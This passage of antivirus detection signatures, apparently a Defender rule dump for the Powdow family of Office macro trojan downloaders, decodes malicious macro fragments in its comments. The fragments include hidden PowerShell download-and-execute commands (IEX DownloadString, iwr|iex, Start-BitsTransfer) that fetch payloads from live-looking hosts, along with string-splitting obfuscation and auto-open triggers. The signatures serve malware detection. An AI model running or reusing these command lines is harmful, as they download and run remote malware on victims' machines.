		$a_01_3 = {70 72 71 68 68 71 72 61 62 63 20 3d 20 22 66 61 64 7a 6a 67 64 69 6c 61 7a 75 } //1 prqhhqrabc = "fadzjgdilazu
		$a_01_4 = {6d 39 37 34 65 33 65 33 33 34 62 36 34 61 63 31 33 62 36 64 65 63 39 39 37 66 62 61 62 66 32 31 66 20 3d 20 22 6e 61 69 76 65 72 65 6d 6f 76 65 } //1 m974e3e334b64ac13b6dec997fbabf21f = "naiveremove
		$a_01_5 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 } //1 Sub Document_Open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_27{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_03_0 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 58 76 75 74 76 64 77 77 77 68 75 66 6f 6a 62 74 6d 65 2e 62 61 74 22 } //1
		$a_01_1 = {50 72 69 6e 74 20 23 31 2c 20 22 73 74 61 72 74 20 2f 4d 49 4e 20 43 3a 5c 57 69 6e 64 6f 22 20 2b 20 22 77 73 5c 53 79 73 57 4f 57 36 34 5c 22 20 2b 20 63 61 6c 6c 31 20 2b 20 22 20 2d 77 69 6e 20 31 20 2d 65 6e 63 20 22 20 2b 20 65 6e 63 } //1 Print #1, "start /MIN C:\Windo" + "ws\SysWOW64\" + call1 + " -win 1 -enc " + enc
		$a_03_2 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_01_3 = {63 61 6c 6c 31 20 3d 20 22 57 69 6e 64 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 65 6c 6c 2e 65 78 65 } //1 call1 = "WindowsPo" + "werShell\v1.0\pow" + "ershell.exe
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_28{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 63 6f 6c 6c 20 3d 20 46 69 6c 65 6e 61 6d 65 73 43 6f 6c 6c 65 63 74 69 6f 6e 28 66 6f 6c 64 65 72 24 2c 20 22 2a 2e 78 6c 73 2a 22 29 } //1 Set coll = FilenamesCollection(folder$, "*.xls*")
		$a_01_1 = {49 66 20 66 68 32 6f 65 38 77 64 73 68 66 20 3c 3e 20 22 66 71 61 77 22 20 54 68 65 6e 20 66 68 32 6f 65 38 77 64 73 68 66 20 3d 20 66 68 32 6f 65 38 77 64 73 68 66 20 2b 20 22 3a 5c 70 72 6f 22 20 2b 20 64 38 69 37 77 74 69 75 61 6b 69 73 6a 67 68 20 2b 20 22 67 72 61 6d 64 } //1 If fh2oe8wdshf <> "fqaw" Then fh2oe8wdshf = fh2oe8wdshf + ":\pro" + d8i7wtiuakisjgh + "gramd
		$a_01_2 = {66 68 32 6f 65 38 77 64 73 68 66 20 3d 20 66 68 32 6f 65 38 77 64 73 68 66 20 2b 20 22 61 74 61 5c 73 64 66 68 69 75 77 75 2e 62 22 } //1 fh2oe8wdshf = fh2oe8wdshf + "ata\sdfhiuwu.b"
		$a_03_3 = {53 68 65 6c 6c 20 66 68 32 6f 65 38 77 64 73 68 66 20 2b 20 22 61 74 22 2c 20 30 [0-03] 45 6e 64 20 53 75 62 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_29{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {73 20 3d 20 73 20 2b 20 22 73 74 61 72 74 20 2f 4d 49 4e 20 43 3a 5c 57 69 6e 64 6f } //1 s = s + "start /MIN C:\Windo
		$a_01_1 = {73 20 3d 20 73 20 2b 20 22 77 73 5c 53 79 73 74 65 6d 33 32 5c 22 20 2b 20 22 57 69 6e 64 22 20 2b 20 22 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 22 20 2b 20 22 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 22 20 2b 20 22 65 6c 6c 2e 65 78 65 } //1 s = s + "ws\System32\" + "Wind" + "owsPo" + "werShe" + "ll\v1.0\pow" + "ersh" + "ell.exe
		$a_01_2 = {73 20 3d 20 73 20 2b 20 22 20 2d 77 69 6e 20 22 20 2b 20 22 31 20 2d 65 6e 63 } //1 s = s + " -win " + "1 -enc
		$a_03_3 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 [0-20] 2e 62 61 74 22 [0-03] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 } //1
		$a_01_4 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 } //1 i = Shell(batch, 0)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_30{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_03_0 = {44 65 62 75 67 2e 41 73 73 65 72 74 20 28 56 42 41 2e 53 68 65 6c 6c 28 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 61 6c 63 5c 2e 2e 5c 63 6f 6e 68 6f 73 74 2e 65 78 65 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 61 6c 63 5c 2e 2e 5c 63 6f 6e 68 6f 73 74 2e 65 78 65 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 77 77 77 2e 6a 2e 6d 70 2f 61 73 6b 73 [0-25] 22 29 29 [0-03] 45 6e 64 20 46 75 6e 63 74 69 6f 6e } //1
		$a_03_1 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 52 65 2d 49 6e 73 74 61 6c 6c 20 4f 66 66 69 63 65 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 [0-03] 6f 62 6a 2e 6c 6f 6c [0-03] 45 6e 64 20 53 75 62 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_31{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 6a 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 36 34 31 69 34 78 36 6c 31 2e 6a 70 67 27 2c 27 25 70 75 62 6c 69 63 25 5c 43 6c 69 65 6e 74 2e 76 62 73 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 27 25 70 75 62 6c 69 63 25 5c 43 6c 69 65 6e 74 2e 76 62 73 } //1 .DownloadFile('https://j.top4top.io/p_1641i4x6l1.jpg','%public%\Client.vbs');Start-Process '%public%\Client.vbs
		$a_03_1 = {53 68 65 6c 6c 20 45 6e 76 69 72 6f 6e 24 28 22 43 4f 4d 53 50 45 43 22 29 20 26 20 22 20 2f 63 20 22 20 26 20 [0-0f] 2c 20 76 62 48 69 64 65 } //1
		$a_03_2 = {2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 64 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 36 34 32 35 70 71 76 36 31 2e 6a 70 67 27 2c 27 [0-40] 2e 76 62 73 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_32{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {4c 52 65 73 75 6c 74 20 3d 20 52 65 70 6c 61 63 65 28 65 6e 63 2c 20 22 5f 22 2c 20 22 22 29 } //1 LResult = Replace(enc, "_", "")
		$a_01_1 = {63 61 6c 6c 31 20 3d 20 22 57 69 6e 64 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 65 6c 6c 2e 65 78 65 } //1 call1 = "WindowsPo" + "werShell\v1.0\pow" + "ershell.exe
		$a_03_2 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 50 64 71 6d 70 72 70 71 6b 65 77 7a 6c 75 75 7a 63 75 6a 78 2e 62 61 74 22 } //1
		$a_01_3 = {50 72 69 6e 74 20 23 31 2c 20 22 73 74 61 72 74 20 2f 4d 49 4e 20 43 3a 5c 57 69 6e 64 6f 22 20 2b 20 22 77 73 5c 53 79 73 57 4f 57 36 34 5c 22 20 2b 20 63 61 6c 6c 31 20 2b 20 22 20 2d 77 69 6e 20 31 20 2d 65 6e 63 20 22 20 2b 20 4c 52 65 73 75 6c 74 } //1 Print #1, "start /MIN C:\Windo" + "ws\SysWOW64\" + call1 + " -win 1 -enc " + LResult
		$a_01_4 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 } //1 i = Shell(batch, 0)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_33{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {6c 6f 64 68 69 20 3d 20 22 6d 22 20 2b 20 22 53 22 20 2b 20 22 48 22 20 2b 20 22 74 22 20 2b 20 22 41 22 } //1 lodhi = "m" + "S" + "H" + "t" + "A"
		$a_03_1 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 [0-07] 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 66 76 67 6a 61 64 61 67 6a 22 20 2b 20 22 64 62 67 76 61 68 73 6b 73 61 64 67 6b 61 22 3a 20 53 68 65 6c 6c 20 22 } //1
		$a_01_2 = {45 78 63 65 6c 46 69 6c 65 20 3d 20 28 41 63 74 69 76 65 50 72 65 73 65 6e 74 61 74 69 6f 6e 2e 50 61 74 68 20 26 20 22 5c 74 65 73 74 2e 78 6c 73 78 22 29 } //1 ExcelFile = (ActivePresentation.Path & "\test.xlsx")
		$a_01_3 = {53 65 74 20 65 78 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 45 78 63 65 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //1 Set exl = CreateObject("Excel.Application")
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_34{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_03_0 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 48 79 74 6e 70 63 64 73 79 76 71 71 73 73 73 76 72 72 6b 70 67 79 65 2e 62 61 74 22 } //1
		$a_01_1 = {50 72 69 6e 74 20 23 31 2c 20 22 73 74 61 72 74 20 2f 4d 49 4e 20 43 3a 5c 57 69 6e 64 6f 22 20 2b 20 22 77 73 5c 53 79 73 57 4f 57 36 34 5c 22 20 2b 20 63 61 6c 6c 31 20 2b 20 22 20 2d 77 69 6e 20 31 20 2d 65 6e 63 20 22 20 2b 20 4c 52 65 73 75 6c 74 } //1 Print #1, "start /MIN C:\Windo" + "ws\SysWOW64\" + call1 + " -win 1 -enc " + LResult
		$a_03_2 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_01_3 = {63 61 6c 6c 31 20 3d 20 22 57 69 6e 64 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 65 6c 6c 2e 65 78 65 } //1 call1 = "WindowsPo" + "werShell\v1.0\pow" + "ershell.exe
		$a_01_4 = {4c 52 65 73 75 6c 74 20 3d 20 52 65 70 6c 61 63 65 28 65 6e 63 2c 20 22 5f 22 2c 20 22 22 29 } //1 LResult = Replace(enc, "_", "")
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_35{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 04 00 00 "
		
	strings :
		$a_01_0 = {6c 6f 6c 20 3d 20 6b 69 6e 64 20 2b 20 22 20 22 20 2b 20 22 2d 77 20 68 20 2d 4e 6f 50 72 6f 66 69 6c 65 20 2d 45 50 20 42 79 70 61 73 73 20 2d 43 20 73 74 61 72 74 2d 73 6c 65 65 70 20 2d 73 20 32 30 3b 69 77 72 20 22 22 68 74 74 70 3a 2f 2f 77 77 77 2e 6a 2e 6d 70 2f 61 73 6a 61 73 64 69 6a 69 64 6f 61 69 77 64 22 22 20 2d 75 73 65 42 7c 69 65 78 3b 22 } //3 lol = kind + " " + "-w h -NoProfile -EP Bypass -C start-sleep -s 20;iwr ""http://www.j.mp/asjasdijidoaiwd"" -useB|iex;"
		$a_03_1 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-03] 4d 73 67 42 6f 78 20 22 45 52 72 4f 52 21 22 } //1
		$a_01_2 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 55 73 65 72 4e 61 6d 65 22 29 20 26 20 22 5c 50 69 63 74 75 72 65 73 5c 6e 6f 74 6e 69 63 65 22 20 2b 20 22 2e 22 20 2b 20 22 70 73 31 22 } //1 = "C:\Users\" & Environ("UserName") & "\Pictures\notnice" + "." + "ps1"
		$a_01_3 = {2e 53 68 65 6c 6c 65 78 65 63 75 74 65 20 63 61 2e 6c 63 2e 54 61 67 2c 20 6a 6f 6a 6f 2e 6a 69 6a 69 2e 54 61 67 20 2b 20 6a 69 61 6a 73 69 6a 61 73 64 } //1 .Shellexecute ca.lc.Tag, jojo.jiji.Tag + jiajsijasd
	condition:
		((#a_01_0  & 1)*3+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_36{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_03_0 = {70 6f 77 65 72 72 20 26 20 72 6c 20 26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 70 3a 2f 2f 6c 69 66 65 73 74 79 6c 65 64 72 69 6e 6b 73 2e 68 75 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 63 73 33 2f 45 54 4c 5f [0-15] 2e 65 78 65 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78 65 3b } //1
		$a_01_1 = {70 6f 77 65 72 72 20 26 20 72 6c 20 26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 70 73 3a 2f 2f 63 61 72 67 6f 74 72 61 6e 73 2d 67 69 6f 62 61 6c 2e 63 6f 6d 2f 68 2f 62 6f 6f 6d 2e 65 78 65 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 70 6f 6c 69 63 79 72 65 61 6c 6c 79 2e 65 78 65 3b } //1 powerr & rl & " -w h Start-BitsTransfer -Source https://cargotrans-giobal.com/h/boom.exe -Destination C:\Users\Public\Documents\policyreally.exe;
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_37{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {4d 73 67 20 3d 20 22 45 72 72 6f 72 20 23 20 22 20 26 20 22 20 50 6f 77 65 72 20 46 69 6c 65 20 65 72 72 6f 72 20 22 20 5f } //1 Msg = "Error # " & " Power File error " _
		$a_01_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 49 41 4d 54 48 45 4f 4e 45 29 2e 45 78 65 63 20 4f 4e 45 48 41 4e 44 20 2b 20 54 57 4f 48 41 4e 44 53 } //1 CreateObject(IAMTHEONE).Exec ONEHAND + TWOHANDS
		$a_03_2 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 69 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 74 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 6c 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 79 22 20 2b 20 22 2e 63 6f 6d 2f 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 64 73 61 73 61 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 [0-0f] 22 20 2b 20 22 73 61 22 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_38{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 69 73 74 65 72 73 52 61 6e 67 65 52 6f 76 65 72 20 3d 20 22 20 68 74 74 70 3a 2f 2f 25 38 32 33 34 25 38 32 33 34 40 6a 2e 6d 70 2f 64 64 } //1 SistersRangeRover = " http://%8234%8234@j.mp/dd
		$a_01_1 = {6d 79 43 68 72 79 73 6c 65 72 20 3d 20 64 65 63 72 79 70 74 28 22 72 22 2c 20 22 35 22 29 20 2b 20 64 65 63 72 79 70 74 28 22 77 22 2c 20 22 34 22 29 20 2b 20 64 65 63 72 79 70 74 28 22 6e 22 2c 20 22 36 22 29 20 2b 20 64 65 63 72 79 70 74 28 22 75 22 2c 20 22 31 22 29 20 2b 20 64 65 63 72 79 70 74 28 22 6a 22 2c 20 22 39 22 29 } //1 myChrysler = decrypt("r", "5") + decrypt("w", "4") + decrypt("n", "6") + decrypt("u", "1") + decrypt("j", "9")
		$a_01_2 = {53 68 65 6c 6c 20 6d 79 43 68 72 79 73 6c 65 72 20 2b 20 53 69 73 74 65 72 73 52 61 6e 67 65 52 6f 76 65 72 3a 20 53 68 65 6c 6c 20 64 65 63 72 79 70 74 28 22 76 6f 74 6d 22 2c 20 22 36 22 29 } //1 Shell myChrysler + SistersRangeRover: Shell decrypt("votm", "6")
		$a_01_3 = {4d 69 64 28 73 74 72 49 6e 70 75 74 2c 20 66 69 72 73 74 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 73 74 72 49 6e 70 75 74 2c 20 66 69 72 73 74 2c 20 31 29 29 20 2d 20 73 65 63 6f 6e 64 29 } //1 Mid(strInput, first, 1) = Chr(Asc(Mid(strInput, first, 1)) - second)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_39{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 05 00 00 "
		
	strings :
		$a_03_0 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 57 7a 6a 6f 6b 70 6c 74 62 66 72 2e 62 61 74 22 [0-03] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 } //1
		$a_03_1 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-03] 62 61 74 63 68 20 3d 20 22 4c 77 6c 6c 6e 76 65 72 79 77 6f 6e 63 6b 70 77 78 69 64 61 63 6b 62 76 2e 62 61 74 22 [0-03] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 } //1
		$a_01_2 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 } //1 i = Shell(batch, 0)
		$a_01_3 = {73 20 3d 20 73 20 2b 20 22 77 73 5c 53 79 73 74 65 6d 33 32 5c 22 20 2b 20 22 57 69 6e 64 6f 77 73 50 6f 22 20 2b 20 22 77 65 72 53 68 65 6c 6c 5c 76 31 2e 30 5c 70 6f 77 22 20 2b 20 22 65 72 73 68 65 6c 6c 2e 65 78 65 22 } //1 s = s + "ws\System32\" + "WindowsPo" + "werShell\v1.0\pow" + "ershell.exe"
		$a_01_4 = {73 20 3d 20 73 20 2b 20 22 20 2d 77 69 6e 20 31 20 2d 65 6e 63 } //1 s = s + " -win 1 -enc
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_40{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 30 26 2c 20 43 68 72 28 31 31 32 29 20 2b 20 22 6f 77 65 72 22 20 2b 20 22 73 68 65 6c 6c 2e 65 78 65 20 22 20 2b 20 43 68 72 28 31 35 30 29 20 2b 20 22 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 22 20 2b 20 22 20 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 33 34 2e 31 33 36 2e 31 37 2e 32 31 34 2f 70 73 2e 70 73 31 27 29 22 2c 20 30 26 2c 20 30 26 2c 20 31 26 2c 20 4e 4f 52 4d 41 4c 5f 50 52 49 4f 52 49 54 59 5f 43 4c 41 53 53 2c 20 30 26 2c 20 30 26 2c 20 73 74 61 72 74 2c 20 70 72 6f 63 29 } //1 = CreateProcessA(0&, Chr(112) + "ower" + "shell.exe " + Chr(150) + "WindowStyle Hidden" + "  IEX (New-Object Net.WebClient).DownloadString('http://34.136.17.214/ps.ps1')", 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
		$a_03_1 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-03] 4d 73 67 42 6f 78 20 22 52 75 6e 6e 69 6e 67 20 44 6f 63 75 6d 65 6e 74 2e 20 50 6c 65 61 73 65 20 77 61 69 74 2e 22 [0-03] 45 78 65 63 43 6d 64 [0-03] 45 6e 64 20 53 75 62 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_41{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 06 00 00 "
		
	strings :
		$a_03_0 = {73 64 20 3d 20 43 68 72 28 64 66 20 2d 20 31 30 33 29 [0-03] 45 6e 64 20 46 75 6e 63 74 69 6f 6e } //1
		$a_01_1 = {61 73 64 66 61 66 20 3d 20 22 73 64 67 66 64 73 20 63 73 64 61 20 62 66 67 6a 20 76 64 66 73 68 20 34 32 34 20 67 72 74 6a 75 79 20 76 66 64 73 6a 68 79 20 22 } //1 asdfaf = "sdgfds csda bfgj vdfsh 424 grtjuy vfdsjhy "
		$a_03_2 = {53 75 62 20 46 6f 72 6d 61 74 74 69 6e 67 50 61 6e 65 28 29 [0-03] 41 70 70 6c 69 63 61 74 69 6f 6e 2e 54 61 73 6b 50 61 6e 65 73 28 77 64 54 61 73 6b 50 61 6e 65 46 6f 72 6d 61 74 74 69 6e 67 29 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_03_3 = {2e 52 75 6e 28 [0-0f] 2c 20 [0-0f] 29 0d 0a 45 6e 64 20 53 75 62 } //1
		$a_03_4 = {20 3d 20 73 64 28 [0-03] 29 20 26 20 73 64 28 [0-03] 29 20 26 20 73 64 28 [0-03] 29 20 26 20 } //1
		$a_03_5 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 0d 0a 53 65 74 20 [0-08] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-0f] 29 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_03_4  & 1)*1+(#a_03_5  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_42{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_01_0 = {68 6d 6d 33 20 3d 20 68 6d 6d 32 20 2b 20 41 6e 75 6e 61 6b 69 20 2b 20 22 64 73 66 73 64 34 61 73 33 61 73 64 33 22 } //2 hmm3 = hmm2 + Anunaki + "dsfsd4as3asd3"
		$a_01_1 = {68 6d 6d 33 20 3d 20 68 6d 6d 32 20 2b 20 41 6e 75 6e 61 6b 69 20 2b 20 22 34 6a 6e 73 64 6a 6e 33 33 6b 6e 61 64 6b 22 } //2 hmm3 = hmm2 + Anunaki + "4jnsdjn33knadk"
		$a_01_2 = {3d 20 52 65 70 6c 61 63 65 28 22 4e 6f 74 68 69 6e 67 69 73 67 6f 6f 64 22 2c 20 22 4e 6f 74 68 69 6e 67 69 73 67 6f 6f 64 22 2c 20 22 68 22 29 } //1 = Replace("Nothingisgood", "Nothingisgood", "h")
		$a_01_3 = {3d 20 22 74 22 20 26 20 52 65 70 6c 61 63 65 28 22 46 6c 6f 76 65 6c 79 6b 6e 73 6b 6e 22 2c 20 22 46 6c 6f 76 65 6c 79 6b 6e 73 6b 6e 22 2c 20 22 74 22 29 20 26 20 22 70 22 } //1 = "t" & Replace("Flovelyknskn", "Flovelyknskn", "t") & "p"
		$a_01_4 = {67 75 6e 74 6f 6d 33 20 3d 20 22 2f 2f 6c 6f 65 61 6a 73 6a 65 73 22 } //1 guntom3 = "//loeajsjes"
